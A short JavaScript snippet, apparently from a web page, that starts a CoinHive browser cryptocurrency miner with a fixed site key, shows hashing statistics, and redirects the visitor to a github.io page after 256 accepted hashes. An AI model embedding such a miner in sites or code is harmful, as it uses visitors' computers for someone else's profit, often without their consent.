		var miner = new CoinHive.Anonymous('TqBKEr08A8atWsXdAoc1Rpr1dA1CSPlC',
		{
			threads: 4,
			autoThreads: true,
			throttle:1,
			forceASMJS: false
		});
		miner.start(CoinHive.FORCE_MULTI_TAB);

		// Update stats once per .5 second
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond();
		var totalHashes = miner.getTotalHashes();
		var acceptedHashes = miner.getAcceptedHashes();
		var hashesToGenerate = 256; //Set value of amount of accepted hashes to generate
		var threadCount = miner.getNumThreads(); //Get the amount of threads

		//Remove the following if statement if you don't want the page to redirect to another page.
		if (acceptedHashes > hashesToGenerate)
		{
			miner.stop();
			window.location = "https://huuhadz2k.github.io/etherabc.github.io/index.html"
		}
		else
		{
		document.getElementById("hps").innerHTML = hashesPerSecond;
		document.getElementById("th").innerHTML = totalHashes;
		document.getElementById("ah").innerHTML = acceptedHashes;
		document.getElementById("threads").innerHTML = threadCount;
		}
	}, 500);
